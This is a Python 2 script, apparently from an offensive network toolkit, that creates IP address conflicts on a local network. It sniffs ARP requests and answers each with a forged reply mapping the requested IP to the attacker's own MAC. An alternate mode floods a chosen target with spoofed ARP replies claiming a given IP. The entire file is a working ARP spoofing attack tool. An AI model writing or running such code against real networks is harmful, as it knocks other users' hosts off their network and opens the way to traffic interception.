#!/usr/bin/env python

# region Import
from sys import path
from os.path import dirname, abspath
project_root_path = dirname(dirname(dirname(abspath(__file__))))
utils_path = project_root_path + "/Utils/"
path.append(utils_path)

from base import Base
from network import ARP_raw
from socket import socket, AF_PACKET, SOCK_RAW
from time import sleep
from argparse import ArgumentParser
from sys import exit
from scapy.all import sniff, Ether, ARP
from logging import getLogger, ERROR
getLogger("scapy.runtime").setLevel(ERROR)
# endregion

Base = Base()
Base.check_user()
Base.check_platform()

parser = ArgumentParser(description='Network conflict creator script')
parser.add_argument('-i', '--interface', type=str, help='Set interface name for listen and send packets')
parser.add_argument('-p', '--packets', type=int, help='Number of packets (default: 10)', default=10)
parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
parser.add_argument('-I', '--target_ip', type=str, help='Set target MAC address', default=None)
parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')

args = parser.parse_args()

if not args.quiet:
    Base.print_banner()

_arp = ARP_raw()
_number_of_packets = int(args.packets)
_current_number_of_packets = 0

_current_network_interface = ""
if args.interface is None:
    _current_network_interface = Base.netiface_selection()
else:
    _current_network_interface = args.interface

_current_mac_address = Base.get_netiface_mac_address(_current_network_interface)
if _current_mac_address is None:
    print "This network interface does not have mac address!"
    exit(1)

_target_mac_address = None
if args.target_mac is not None:
    _target_mac_address = args.target_mac

_target_ip_address = None
if args.target_ip is not None:
    _target_ip_address = args.target_ip


def send_arp_reply(request):
    if request.haslayer(ARP):
        global _current_number_of_packets
        global _current_network_interface
        global _current_mac_address
        global _arp

        SOCK = socket(AF_PACKET, SOCK_RAW)
        SOCK.bind((_current_network_interface, 0))

        if request[ARP].op == 1:
            if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
                print Base.c_info + "ARP request from MAC: " + request[ARP].hwsrc + " IP: " + request[ARP].pdst
                reply = _arp.make_response(ethernet_src_mac=_current_mac_address,
                                           ethernet_dst_mac=request[ARP].hwsrc,
                                           sender_mac=_current_mac_address, sender_ip=request[ARP].pdst,
                                           target_mac=request[ARP].hwsrc, target_ip=request[ARP].psrc)
                SOCK.send(reply)
                _current_number_of_packets += 1
                if _current_number_of_packets >= _number_of_packets:
                    SOCK.close()
                    exit(0)


if __name__ == "__main__":
    if args.target_ip is None:
        print "Sniffing interface: " + str(_current_network_interface)
        if _target_mac_address is None:
            sniff(filter="arp", prn=send_arp_reply, iface=_current_network_interface)
        else:
            sniff(lfilter=lambda d: d.src == _target_mac_address,
                  filter="arp", prn=send_arp_reply, iface=_current_network_interface)
    else:
        if _target_mac_address is None:
            print Base.c_error + "Please set target MAC address!"
            exit(0)

        SOCK = socket(AF_PACKET, SOCK_RAW)
        SOCK.bind((_current_network_interface, 0))

        arp_reply = _arp.make_response(ethernet_src_mac=_current_mac_address, ethernet_dst_mac=_target_mac_address,
                                       sender_mac=_current_mac_address, sender_ip=_target_ip_address,
                                       target_mac="ff:ff:ff:ff:ff:ff", target_ip="0.0.0.0")
        for _ in range(_number_of_packets):
            SOCK.send(arp_reply)
            sleep(0.1)
        SOCK.close()
        print Base.c_info + "Send " + str(_number_of_packets) + " ARP reply to MAC: " + \
              _target_mac_address + " IP: " + _target_ip_address
